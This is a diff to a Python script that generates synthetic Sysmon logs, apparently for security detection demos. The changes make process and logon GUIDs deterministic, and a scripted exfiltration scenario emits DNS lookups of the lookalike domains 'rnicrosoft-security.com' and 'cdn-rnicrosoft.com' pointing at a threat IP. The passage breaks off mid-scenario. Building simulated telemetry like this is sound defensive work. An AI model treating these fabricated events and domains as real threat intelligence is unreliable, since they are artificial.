@@ -560,12 +560,13 @@ def _generate_guid(seed: str = None) -> str:
 
 
 def _generate_hashes(image_path: str) -> str:
-    """Generate deterministic hash triplet from image path."""
+    """Generate deterministic hash quartet from image path (SHA256, MD5, SHA1, IMPHASH)."""
     h = hashlib.sha256(image_path.encode()).hexdigest()
     sha256 = h.upper()[:64]
     md5 = hashlib.md5(image_path.encode()).hexdigest().upper()
     sha1 = hashlib.sha1(image_path.encode()).hexdigest().upper()
-    return f"SHA256={sha256},MD5={md5},SHA1={sha1}"
+    imphash = hashlib.md5(f"imp:{image_path}".encode()).hexdigest().upper()
+    return f"SHA256={sha256},MD5={md5},SHA1={sha1},IMPHASH={imphash}"
 
 
 def _kv_header(event_id: int, computer: str, ts: datetime, demo_id: str = None) -> str:
@@ -643,11 +644,24 @@ def _random_second(minute_start: int = 0, minute_end: int = 59) -> Tuple[int, in
 def sysmon_eid1(ts: datetime, computer: str, user: str, image: str,
                 command_line: str, parent_image: str = None,
                 parent_command_line: str = None,
-                demo_id: str = None) -> str:
-    """EID 1 - Process Create."""
+                demo_id: str = None,
+                process_guid: str = None, process_id: int = None,
+                parent_process_guid: str = None,
+                logon_guid: str = None) -> str:
+    """EID 1 - Process Create.
+
+    Args:
+        process_guid: Deterministic GUID for this process (None = random).
+        process_id: PID for this process (None = random).
+        parent_process_guid: GUID of the parent process (None = random).
+        logon_guid: Logon session GUID (None = random).
+    """
     header = _kv_header(1, computer, ts)
-    process_id = random.randint(1000, 65000)
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
     parent_pid = random.randint(500, 10000)
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    p_proc_guid = parent_process_guid if parent_process_guid is not None else _generate_guid()
+    l_guid = logon_guid if logon_guid is not None else _generate_guid()
 
     image_name = image.rsplit("\\", 1)[-1] if "\\" in image else image
     parent_name, parent_path = PARENT_CHAINS.get(
@@ -659,11 +673,28 @@ def sysmon_eid1(ts: datetime, computer: str, user: str, image: str,
 
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
 
+    # Fix 6: TerminalSessionId varies by context
+    if "SYSTEM" in user or "NETWORK SERVICE" in user or "LOCAL SERVICE" in user:
+        session_id = 0
+    else:
+        session_id = 1
+
+    # Fix 7: CurrentDirectory varies by process context
+    if "SYSTEM" in user or image.lower().startswith("c:\\windows"):
+        current_dir = "C:\\Windows\\System32\\"
+    elif "\\Temp\\" in image:
+        current_dir = image.rsplit("\\", 1)[0] + "\\"
+    elif "Program Files" in image:
+        current_dir = image.rsplit("\\", 1)[0] + "\\"
+    else:
+        username = user.split("\\")[-1] if "\\" in user else user
+        current_dir = f"C:\\Users\\{username}\\"
+
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {process_id}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"FileVersion: 10.0.19041.1 (WinBuild.160101.0800)",
         f"Description: {image_name}",
@@ -671,14 +702,14 @@ def sysmon_eid1(ts: datetime, computer: str, user: str, image: str,
         f"Company: Microsoft Corporation",
         f"OriginalFileName: {image_name}",
         f"CommandLine: {command_line}",
-        f"CurrentDirectory: C:\\Windows\\System32\\",
+        f"CurrentDirectory: {current_dir}",
         f"User: {user}",
-        f"LogonGuid: {_generate_guid()}",
+        f"LogonGuid: {l_guid}",
         f"LogonId: 0x{random.randint(0x10000, 0xFFFFFF):X}",
-        f"TerminalSessionId: 0",
+        f"TerminalSessionId: {session_id}",
         f"IntegrityLevel: {'System' if 'SYSTEM' in user else 'Medium'}",
         f"Hashes: {_generate_hashes(image)}",
-        f"ParentProcessGuid: {_generate_guid()}",
+        f"ParentProcessGuid: {p_proc_guid}",
         f"ParentProcessId: {parent_pid}",
         f"ParentImage: {parent_path}",
         f"ParentCommandLine: {parent_command_line or parent_path}",
@@ -690,10 +721,13 @@ def sysmon_eid1(ts: datetime, computer: str, user: str, image: str,
 def sysmon_eid3(ts: datetime, computer: str, user: str, image: str,
                 protocol: str, src_ip: str, src_port: int,
                 dst_ip: str, dst_port: int,
-                demo_id: str = None) -> str:
+                demo_id: str = None,
+                process_guid: str = None, process_id: int = None) -> str:
     """EID 3 - Network Connection."""
     header = _kv_header(3, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     # Determine if destination is local
     dst_hostname = ""
@@ -710,8 +744,8 @@ def sysmon_eid3(ts: datetime, computer: str, user: str, image: str,
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"User: {user}",
         f"Protocol: {protocol}",
@@ -733,16 +767,19 @@ def sysmon_eid3(ts: datetime, computer: str, user: str, image: str,
 
 
 def sysmon_eid11(ts: datetime, computer: str, user: str, image: str,
-                 target_filename: str, demo_id: str = None) -> str:
+                 target_filename: str, demo_id: str = None,
+                 process_guid: str = None, process_id: int = None) -> str:
     """EID 11 - File Create."""
     header = _kv_header(11, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"TargetFilename: {target_filename}",
         f"CreationUtcTime: {utc_time}",
@@ -754,17 +791,20 @@ def sysmon_eid11(ts: datetime, computer: str, user: str, image: str,
 
 def sysmon_eid13(ts: datetime, computer: str, user: str, image: str,
                  event_type: str, target_object: str, details: str,
-                 demo_id: str = None) -> str:
+                 demo_id: str = None,
+                 process_guid: str = None, process_id: int = None) -> str:
     """EID 13 - Registry Value Set."""
     header = _kv_header(13, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     msg_lines = [
         f"RuleName: -",
         f"EventType: {event_type}",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"TargetObject: {target_object}",
         f"Details: {details}",
@@ -775,16 +815,19 @@ def sysmon_eid13(ts: datetime, computer: str, user: str, image: str,
 
 def sysmon_eid22(ts: datetime, computer: str, user: str, image: str,
                  query_name: str, query_status: str = "0",
-                 query_results: str = "", demo_id: str = None) -> str:
+                 query_results: str = "", demo_id: str = None,
+                 process_guid: str = None, process_id: int = None) -> str:
     """EID 22 - DNS Query."""
     header = _kv_header(22, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"QueryName: {query_name}",
         f"QueryStatus: {query_status}",
         f"QueryResults: {query_results if query_results else '::ffff:0.0.0.0;'}",
@@ -795,16 +838,19 @@ def sysmon_eid22(ts: datetime, computer: str, user: str, image: str,
 
 
 def sysmon_eid5(ts: datetime, computer: str, user: str, image: str,
-                demo_id: str = None) -> str:
+                demo_id: str = None,
+                process_guid: str = None, process_id: int = None) -> str:
     """EID 5 - Process Terminated."""
     header = _kv_header(5, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"User: {user}",
     ]
@@ -812,10 +858,13 @@ def sysmon_eid5(ts: datetime, computer: str, user: str, image: str,
 
 
 def sysmon_eid7(ts: datetime, computer: str, user: str, image: str,
-                image_loaded: str, demo_id: str = None) -> str:
+                image_loaded: str, demo_id: str = None,
+                process_guid: str = None, process_id: int = None) -> str:
     """EID 7 - Image Loaded (DLL)."""
     header = _kv_header(7, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    proc_guid = process_guid if process_guid is not None else _generate_guid()
+    pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     dll_name = image_loaded.rsplit("\\", 1)[-1] if "\\" in image_loaded else image_loaded
     signed = "true" if "Windows" in image_loaded or "Microsoft" in image_loaded else "false"
@@ -824,8 +873,8 @@ def sysmon_eid7(ts: datetime, computer: str, user: str, image: str,
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"ProcessGuid: {_generate_guid()}",
-        f"ProcessId: {random.randint(1000, 65000)}",
+        f"ProcessGuid: {proc_guid}",
+        f"ProcessId: {pid}",
         f"Image: {image}",
         f"ImageLoaded: {image_loaded}",
         f"FileVersion: 10.0.19041.1 (WinBuild.160101.0800)",
@@ -845,20 +894,25 @@ def sysmon_eid7(ts: datetime, computer: str, user: str, image: str,
 def sysmon_eid8(ts: datetime, computer: str, source_user: str,
                 source_image: str, source_pid: int,
                 target_image: str, target_pid: int,
-                demo_id: str = None) -> str:
+                demo_id: str = None,
+                process_guid: str = None, process_id: int = None) -> str:
     """EID 8 - CreateRemoteThread.
 
     Very rare in baseline (legitimate: AV scanning, debugging, .NET CLR).
     Primarily appears in attack scenarios (process injection).
+
+    process_guid/process_id map to SourceProcessGuid/SourceProcessId.
     """
     header = _kv_header(8, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    src_proc_guid = process_guid if process_guid is not None else _generate_guid()
+    src_pid = process_id if process_id is not None else source_pid
 
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"SourceProcessGuid: {_generate_guid()}",
-        f"SourceProcessId: {source_pid}",
+        f"SourceProcessGuid: {src_proc_guid}",
+        f"SourceProcessId: {src_pid}",
         f"SourceImage: {source_image}",
         f"TargetProcessGuid: {_generate_guid()}",
         f"TargetProcessId: {target_pid}",
@@ -876,14 +930,19 @@ def sysmon_eid8(ts: datetime, computer: str, source_user: str,
 def sysmon_eid10(ts: datetime, computer: str, source_user: str,
                  source_image: str, target_image: str,
                  granted_access: str, call_trace: str = "",
-                 demo_id: str = None) -> str:
+                 demo_id: str = None,
+                 process_guid: str = None, process_id: int = None) -> str:
     """EID 10 - ProcessAccess.
 
     Key for detecting LSASS credential dumping. Baseline shows legitimate
     access from svchost.exe, csrss.exe, wininit.exe.
+
+    process_guid/process_id map to SourceProcessGuid/SourceProcessId.
     """
     header = _kv_header(10, computer, ts)
     utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"
+    src_proc_guid = process_guid if process_guid is not None else _generate_guid()
+    src_pid = process_id if process_id is not None else random.randint(1000, 65000)
 
     if not call_trace:
         call_trace = "C:\\Windows\\SYSTEM32\\ntdll.dll+9D4C4|C:\\Windows\\System32\\KERNELBASE.dll+2B3ED"
@@ -891,11 +950,11 @@ def sysmon_eid10(ts: datetime, computer: str, source_user: str,
     msg_lines = [
         f"RuleName: -",
         f"UtcTime: {utc_time}",
-        f"SourceProcessGUID: {_generate_guid()}",
-        f"SourceProcessId: {random.randint(1000, 65000)}",
+        f"SourceProcessGuid: {src_proc_guid}",
+        f"SourceProcessId: {src_pid}",
         f"SourceThreadId: {random.randint(1000, 30000)}",
         f"SourceImage: {source_image}",
-        f"TargetProcessGUID: {_generate_guid()}",
+        f"TargetProcessGuid: {_generate_guid()}",
         f"TargetProcessId: {random.randint(500, 5000)}",
         f"TargetImage: {target_image}",
         f"GrantedAccess: {granted_access}",
@@ -941,6 +1000,13 @@ def _generate_server_event(ts: datetime, server_name: str, server_info: dict) ->
     image_name = proc["name"]
     user = SYSTEM_USER if proc["system"] else f"{DOMAIN_PREFIX}\\svc_admin"
 
+    # Deterministic process GUID and PID per process session (Fix 1)
+    day = ts.timetuple().tm_yday
+    pid = random.randint(1000, 65000)
+    proc_guid = _generate_guid(seed=f"{computer}:{image}:{pid}:{day}:{ts.hour}")
+    # Deterministic logon GUID per user+computer+day (Fix 2)
+    logon_guid = _generate_guid(seed=f"logon:{computer}:{user}:{day}")
+
     if eid == 1:
         # Process Create
         cmd_lines = {
@@ -958,36 +1024,43 @@ def _generate_server_event(ts: datetime, server_name: str, server_info: dict) ->
             "wuauclt.exe": "wuauclt.exe /RunHandlerComServer",
         }
         cmd = cmd_lines.get(image_name, image)
-        return sysmon_eid1(ts, computer, user, image, cmd)
+        return sysmon_eid1(ts, computer, user, image, cmd,
+                           process_guid=proc_guid, process_id=pid,
+                           logon_guid=logon_guid)
 
     elif eid == 3:
         # Network Connection
         target = random.choice(SERVER_NETWORK_TARGETS)
         src_port = random.randint(49152, 65535)
         return sysmon_eid3(ts, computer, user, image, target["protocol"],
-                           server_ip, src_port, target["dst_ip"], target["dst_port"])
+                           server_ip, src_port, target["dst_ip"], target["dst_port"],
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 11:
         # File Create
         template = random.choice(SERVER_FILE_TARGETS)
         filename = template.replace("{rand}", f"{random.randint(10000, 99999):05X}")
         filename = filename.replace("{date}", ts.strftime("%y%m%d"))
-        return sysmon_eid11(ts, computer, user, image, filename)
+        return sysmon_eid11(ts, computer, user, image, filename,
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 13:
         # Registry Value Set
         reg_path = random.choice(SERVER_REGISTRY_PATHS)
         return sysmon_eid13(ts, computer, user, image, "SetValue", reg_path,
-                            f"DWORD (0x{random.randint(0, 0xFF):08x})")
+                            f"DWORD (0x{random.randint(0, 0xFF):08x})",
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 5:
         # Process Terminated — mirrors process create
-        return sysmon_eid5(ts, computer, user, image)
+        return sysmon_eid5(ts, computer, user, image,
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 7:
         # Image Loaded (DLL) — common system DLLs loaded by server processes
         dll = random.choice(SERVER_DLLS)
-        return sysmon_eid7(ts, computer, user, image, dll)
+        return sysmon_eid7(ts, computer, user, image, dll,
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 8:
         # CreateRemoteThread — very rare in baseline (AV/monitoring only)
@@ -999,7 +1072,8 @@ def _generate_server_event(ts: datetime, server_name: str, server_info: dict) ->
         ])
         return sysmon_eid8(ts, computer, SYSTEM_USER, source_image,
                            random.randint(1000, 5000), target_image,
-                           random.randint(500, 5000))
+                           random.randint(500, 5000),
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 10:
         # ProcessAccess — legitimate access to system processes
@@ -1015,7 +1089,8 @@ def _generate_server_event(ts: datetime, server_name: str, server_info: dict) ->
             source_image = image
             access_mask, _ = random.choice(PROCESS_ACCESS_MASKS[:3])  # never ALL_ACCESS baseline
         return sysmon_eid10(ts, computer, SYSTEM_USER, source_image,
-                            target, access_mask)
+                            target, access_mask,
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 22:
         # DNS Query
@@ -1027,7 +1102,8 @@ def _generate_server_event(ts: datetime, server_name: str, server_info: dict) ->
             result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
         dns_image = "C:\\Windows\\System32\\svchost.exe"
         return sysmon_eid22(ts, computer, SYSTEM_USER, dns_image, query,
-                            query_results=result)
+                            query_results=result,
+                            process_guid=proc_guid, process_id=pid)
 
     return ""
 
@@ -1074,6 +1150,13 @@ def _generate_workstation_event(ts: datetime, user_obj) -> str:
     image = proc["image"]
     image_name = proc["name"]
 
+    # Deterministic process GUID and PID per process session (Fix 1)
+    day = ts.timetuple().tm_yday
+    pid = random.randint(1000, 65000)
+    proc_guid = _generate_guid(seed=f"{computer}:{image}:{pid}:{day}:{ts.hour}")
+    # Deterministic logon GUID per user+computer+day (Fix 2)
+    logon_guid = _generate_guid(seed=f"logon:{computer}:{user_str}:{day}")
+
     if eid == 1:
         # Process Create
         cmd_lines = {
@@ -1087,42 +1170,50 @@ def _generate_workstation_event(ts: datetime, user_obj) -> str:
             "notepad.exe": "C:\\Windows\\System32\\notepad.exe",
         }
         cmd = cmd_lines.get(image_name, image)
-        return sysmon_eid1(ts, computer, user_str, image, cmd)
+        return sysmon_eid1(ts, computer, user_str, image, cmd,
+                           process_guid=proc_guid, process_id=pid,
+                           logon_guid=logon_guid)
 
     elif eid == 3:
         # Network Connection
         target = random.choice(WORKSTATION_NETWORK_TARGETS)
         src_port = random.randint(49152, 65535)
         return sysmon_eid3(ts, computer, user_str, image, target["protocol"],
-                           user_ip, src_port, target["dst_ip"], target["dst_port"])
+                           user_ip, src_port, target["dst_ip"], target["dst_port"],
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 11:
         # File Create
         template = random.choice(WORKSTATION_FILE_TARGETS)
         filename = template.replace("{user}", user_obj.username)
         filename = filename.replace("{rand}", f"{random.randint(10000, 99999):05X}")
-        return sysmon_eid11(ts, computer, user_str, image, filename)
+        return sysmon_eid11(ts, computer, user_str, image, filename,
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 13:
         # Registry Value Set
         reg_path = random.choice(WORKSTATION_REGISTRY_PATHS)
         return sysmon_eid13(ts, computer, user_str, image, "SetValue", reg_path,
-                            f"DWORD (0x{random.randint(0, 0xFF):08x})")
+                            f"DWORD (0x{random.randint(0, 0xFF):08x})",
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 5:
         # Process Terminated
-        return sysmon_eid5(ts, computer, user_str, image)
+        return sysmon_eid5(ts, computer, user_str, image,
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 7:
         # Image Loaded (DLL)
         dll = random.choice(WORKSTATION_DLLS)
-        return sysmon_eid7(ts, computer, user_str, image, dll)
+        return sysmon_eid7(ts, computer, user_str, image, dll,
+                           process_guid=proc_guid, process_id=pid)
 
     elif eid == 10:
         # ProcessAccess — workstation processes accessing system processes
         target = random.choice(PROCESS_ACCESS_TARGETS_WS)
         access_mask, _ = random.choice(PROCESS_ACCESS_MASKS[:2])  # limited access only
-        return sysmon_eid10(ts, computer, user_str, image, target, access_mask)
+        return sysmon_eid10(ts, computer, user_str, image, target, access_mask,
+                            process_guid=proc_guid, process_id=pid)
 
     elif eid == 22:
         # DNS Query
@@ -1130,7 +1221,8 @@ def _generate_workstation_event(ts: datetime, user_obj) -> str:
         dns_image = "C:\\Windows\\System32\\svchost.exe"
         result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
         return sysmon_eid22(ts, computer, user_str, dns_image, query,
-                            query_results=result)
+                            query_results=result,
+                            process_guid=proc_guid, process_id=pid)
 
     return ""
 
@@ -1172,7 +1264,9 @@ def _resolve_template(template: str, username: str) -> str:
     return result
 
 
-def _client_process_create(ts: datetime, client, profile: dict) -> List[str]:
+def _client_process_create(ts: datetime, client, profile: dict,
+                           process_guid: str = None, process_id: int = None,
+                           logon_guid: str = None) -> List[str]:
     """EID 1 -- Process creation from app profile.
 
     Creates the main process and optionally a child process (30% chance
@@ -1184,7 +1278,9 @@ def _client_process_create(ts: datetime, client, profile: dict) -> List[str]:
     proc = profile["proc"]
 
     cmd = _resolve_template(proc["cmd"], client.username)
-    events.append(sysmon_eid1(ts, computer, user_str, proc["image"], cmd))
+    events.append(sysmon_eid1(ts, computer, user_str, proc["image"], cmd,
+                              process_guid=process_guid, process_id=process_id,
+                              logon_guid=logon_guid))
 
     # Child process (30% chance if profile has children)
     if proc.get("children") and random.random() < 0.30:
@@ -1192,15 +1288,22 @@ def _client_process_create(ts: datetime, client, profile: dict) -> List[str]:
         child_ts = ts.replace(second=min(59, ts.second + random.randint(1, 3)),
                               microsecond=random.randint(0, 999999))
         child_cmd = _resolve_template(child["cmd"], client.username)
+        # Child gets its own GUID but references parent's GUID
+        child_pid = random.randint(1000, 65000)
+        child_guid = _generate_guid(seed=f"{computer}:{child['image']}:{child_pid}:{ts.timetuple().tm_yday}:{ts.hour}")
         events.append(sysmon_eid1(
             child_ts, computer, user_str, child["image"], child_cmd,
-            parent_image=proc["image"], parent_command_line=cmd
+            parent_image=proc["image"], parent_command_line=cmd,
+            process_guid=child_guid, process_id=child_pid,
+            parent_process_guid=process_guid,
+            logon_guid=logon_guid
         ))
 
     return events
 
 
-def _client_network_connect(ts: datetime, client, profile: dict) -> List[str]:
+def _client_network_connect(ts: datetime, client, profile: dict,
+                            process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 3 -- Network connection from app profile targets."""
     events = []
     if not profile["network"]:
@@ -1214,19 +1317,23 @@ def _client_network_connect(ts: datetime, client, profile: dict) -> List[str]:
 
     events.append(sysmon_eid3(
         ts, computer, user_str, proc["image"], target["protocol"],
-        client.ip_address, src_port, target["dst_ip"], target["dst_port"]
+        client.ip_address, src_port, target["dst_ip"], target["dst_port"],
+        process_guid=process_guid, process_id=process_id
     ))
     return events
 
 
-def _client_process_terminate(ts: datetime, client, profile: dict) -> List[str]:
+def _client_process_terminate(ts: datetime, client, profile: dict,
+                              process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 5 -- Process termination matching profile app."""
     computer = client.device_name
     user_str = f"{DOMAIN_PREFIX}\\{client.username}"
-    return [sysmon_eid5(ts, computer, user_str, profile["proc"]["image"])]
+    return [sysmon_eid5(ts, computer, user_str, profile["proc"]["image"],
+                        process_guid=process_guid, process_id=process_id)]
 
 
-def _client_image_loaded(ts: datetime, client, profile: dict) -> List[str]:
+def _client_image_loaded(ts: datetime, client, profile: dict,
+                         process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 7 -- DLL load from profile-specific and common DLLs."""
     events = []
     computer = client.device_name
@@ -1236,11 +1343,13 @@ def _client_image_loaded(ts: datetime, client, profile: dict) -> List[str]:
     # Use profile-specific DLLs if available, fallback to common workstation DLLs
     dll_pool = profile.get("dlls", []) + WORKSTATION_DLLS[:4]
     dll = random.choice(dll_pool)
-    events.append(sysmon_eid7(ts, computer, user_str, proc["image"], dll))
+    events.append(sysmon_eid7(ts, computer, user_str, proc["image"], dll,
+                              process_guid=process_guid, process_id=process_id))
     return events
 
 
-def _client_file_create(ts: datetime, client, profile: dict) -> List[str]:
+def _client_file_create(ts: datetime, client, profile: dict,
+                        process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 11 -- File creation from profile activity (cache, temp, docs)."""
     events = []
     computer = client.device_name
@@ -1253,11 +1362,13 @@ def _client_file_create(ts: datetime, client, profile: dict) -> List[str]:
         file_pool = WORKSTATION_FILE_TARGETS
     template = random.choice(file_pool)
     filename = _resolve_template(template, client.username)
-    events.append(sysmon_eid11(ts, computer, user_str, proc["image"], filename))
+    events.append(sysmon_eid11(ts, computer, user_str, proc["image"], filename,
+                               process_guid=process_guid, process_id=process_id))
     return events
 
 
-def _client_registry_set(ts: datetime, client) -> List[str]:
+def _client_registry_set(ts: datetime, client,
+                         process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 13 -- Registry value set from app settings and user preferences."""
     events = []
     computer = client.device_name
@@ -1273,12 +1384,14 @@ def _client_registry_set(ts: datetime, client) -> List[str]:
     ])
     events.append(sysmon_eid13(
         ts, computer, user_str, reg_proc, "SetValue", reg_path,
-        f"DWORD (0x{random.randint(0, 0xFF):08x})"
+        f"DWORD (0x{random.randint(0, 0xFF):08x})",
+        process_guid=process_guid, process_id=process_id
     ))
     return events
 
 
-def _client_dns_query(ts: datetime, client, profile: dict) -> List[str]:
+def _client_dns_query(ts: datetime, client, profile: dict,
+                      process_guid: str = None, process_id: int = None) -> List[str]:
     """EID 22 -- DNS queries matching profile domains."""
     events = []
     computer = client.device_name
@@ -1292,7 +1405,8 @@ def _client_dns_query(ts: datetime, client, profile: dict) -> List[str]:
     result = f"::ffff:{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)};"
     dns_image = "C:\\Windows\\System32\\svchost.exe"
     events.append(sysmon_eid22(ts, computer, user_str, dns_image, query,
-                               query_results=result))
+                               query_results=result,
+                               process_guid=process_guid, process_id=process_id))
     return events
 
 
@@ -1323,6 +1437,11 @@ def generate_client_sysmon_hour(base_date: str, day: int, hour: int,
     )
 
     base_dt = dt.replace(hour=hour)
+    computer = client.device_name
+    user_str = f"{DOMAIN_PREFIX}\\{client.username}"
+    # Deterministic logon GUID per user+computer+day (Fix 2)
+    yday = dt.timetuple().tm_yday
+    logon_guid = _generate_guid(seed=f"logon:{computer}:{user_str}:{yday}")
 
     for _ in range(count):
         minute = random.randint(0, 59)
@@ -1334,20 +1453,32 @@ def generate_client_sysmon_hour(base_date: str, day: int, hour: int,
         profile = _pick_app_profile()
         eid = _pick_eid(CLIENT_EID_WEIGHTS)
 
+        # Deterministic process GUID and PID per event cluster (Fix 1)
+        pid = random.randint(1000, 65000)
+        proc_guid = _generate_guid(seed=f"{computer}:{profile['proc']['image']}:{pid}:{yday}:{hour}")
+
         if eid == 1:
-            events.extend(_client_process_create(ts, client, profile))
+            events.extend(_client_process_create(ts, client, profile,
+                                                 process_guid=proc_guid, process_id=pid,
+                                                 logon_guid=logon_guid))
         elif eid == 3:
-            events.extend(_client_network_connect(ts, client, profile))
+            events.extend(_client_network_connect(ts, client, profile,
+                                                  process_guid=proc_guid, process_id=pid))
         elif eid == 5:
-            events.extend(_client_process_terminate(ts, client, profile))
+            events.extend(_client_process_terminate(ts, client, profile,
+                                                    process_guid=proc_guid, process_id=pid))
         elif eid == 7:
-            events.extend(_client_image_loaded(ts, client, profile))
+            events.extend(_client_image_loaded(ts, client, profile,
+                                               process_guid=proc_guid, process_id=pid))
         elif eid == 11:
-            events.extend(_client_file_create(ts, client, profile))
+            events.extend(_client_file_create(ts, client, profile,
+                                              process_guid=proc_guid, process_id=pid))
         elif eid == 13:
-            events.extend(_client_registry_set(ts, client))
+            events.extend(_client_registry_set(ts, client,
+                                               process_guid=proc_guid, process_id=pid))
         elif eid == 22:
-            events.extend(_client_dns_query(ts, client, profile))
+            events.extend(_client_dns_query(ts, client, profile,
+                                            process_guid=proc_guid, process_id=pid))
 
     return events
 
@@ -1356,13 +1487,18 @@ def generate_client_sysmon_hour(base_date: str, day: int, hour: int,
 # SCENARIO: EXFIL (Day 4-13)
 # =============================================================================
 
+# Exfil scenario Windows short usernames (used in file paths)
+EXFIL_LATERAL_WIN_USER = "jbrown"    # jessica.brown's Windows short username
+EXFIL_TARGET_WIN_USER = "amiller"    # alex.miller's Windows short username
+
+
 def generate_exfil_events(base_date: str, day: int, hour: int) -> List[str]:
     """Generate exfil scenario Sysmon events for a specific day/hour."""
     events = []
 
     # Phase mapping
     # Day 4: Initial Access (jessica.brown, ATL)
-    # Day 5-7: Lateral Movement (ATL → BOS)
+    # Day 5-7: Lateral Movement (ATL -> BOS)
     # Day 8-10: Persistence (alex.miller, BOS)
     # Day 11-13: Exfiltration (alex.miller, BOS)
 
@@ -1376,278 +1512,413 @@ def generate_exfil_events(base_date: str, day: int, hour: int) -> List[str]:
 
     demo_id = "exfil"
 
+    # Deterministic logon GUIDs per user+computer+day
+    jessica_logon_guid = _generate_guid(seed=f"logon:{jessica_computer}:{jessica_user}:{day}")
+    alex_logon_guid = _generate_guid(seed=f"logon:{alex_computer}:{alex_user}:{day}")
+
     # =========================================================================
     # Day 4: Initial Access
     # =========================================================================
     if day == 4:
         if hour == 10:
+            # Edge browser process for phishing
+            edge_image = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+            edge_pid = 14200
+            edge_guid = _generate_guid(seed=f"exfil:{jessica_computer}:edge:{day}")
+
             # 10:15 - DNS resolve phishing domain
             ts = date_add(base_date, day).replace(hour=10, minute=15, second=23)
             events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
-                                       "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                                       edge_image,
                                        "rnicrosoft-security.com",
                                        query_results=f"::ffff:{THREAT_IP};",
-                                       demo_id=demo_id))
+                                       demo_id=demo_id,
+                                       process_guid=edge_guid, process_id=edge_pid))
 
             # 10:15 - DNS resolve C2 staging
             ts = ts.replace(second=35)
             events.append(sysmon_eid22(ts, jessica_computer, jessica_user,
-                                       "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                                       edge_image,
                                        "cdn-rnicrosoft.com",
                                        query_results=f"::ffff:{THREAT_IP};",
-                                       demo_id=demo_id))
+                                       demo_id=demo_id,
+                                       process_guid=edge_guid, process_id=edge_pid))
 
             # 10:16 - Network connection to threat IP
             ts = ts.replace(minute=16, second=2)
             events.append(sysmon_eid3(ts, jessica_computer, jessica_user,
